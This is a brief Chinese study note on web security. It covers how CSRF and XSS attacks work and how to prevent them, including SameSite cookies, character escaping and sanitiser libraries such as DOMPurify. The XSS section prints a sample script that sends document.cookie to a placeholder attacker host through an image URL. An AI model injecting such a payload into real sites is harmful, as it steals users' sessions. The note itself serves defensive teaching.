# Safe
## CSRF
- Cross-site request forgery 跨站请求伪造
- CSRF 的过程
  - 用户登录了 `a.com` ，有了 cookie
  - 黑客引诱用户访问 `b.com` 网页，并在其中发起一个跨站请求 `a.com/api/xxx`
  - `a.com` API 收到 cookie ，误以为是真实用户的请求，就受理了
- CSRF 的预防
  - 严格的跨域请求限制
  - 为 cookie 设置 `SameSite` 不随跨域请求被发送
    - `Set-Cookie: key1=val1; key2=val2; SameSite=Strict;`
    - SameSite=Strict Cookie 不能随着跳转链接跨站发送
    - SameSite=Lax 允许 GET/HEAD 等安全方法，但禁止 POST 跨站发送
  - 关键接口使用短信验证码等双重验证
## XSS
- Cross Site Scripting 跨站脚本攻击
- Xss 过程
  - 用户通过某种方式（如输入框、文本编辑器）输入一些内容，其中带有攻击代码（JS 代码）。
  - 该内容再显示时，这些代码也将会被执行，形成了攻击效果。
  ```html
  <!-- 例如用户提交的内容中有： -->
  <script>
      var img = document.createElement('img')
      img.src = 'http://xxx.com/api/xxx?userInfo=' + document.cookie // 将 cookie 提交到自己的服务器
  </script>
  ```
- xss 预防：替换特殊字符（最简单的解决方式）
  ```js
  const newStr = str.replaceAll('<', '&lt;').replaceAll('>', '&gt;')
  ```
- 第三方工具
  - [DOMPurify](https://github.com/cure53/DOMPurify) HTML 清理(高)
  - [xss](https://jsxss.com/zh/index.html) XSS 过滤(中)
  - [escape-html](https://github.com/component/escape-html) HTML 转义(低)
- 现代框架默认会屏蔽 XSS 攻击，除非自己手动开启
  - Vue `v-html`
  - React `dangerouslySetInnerHTML`
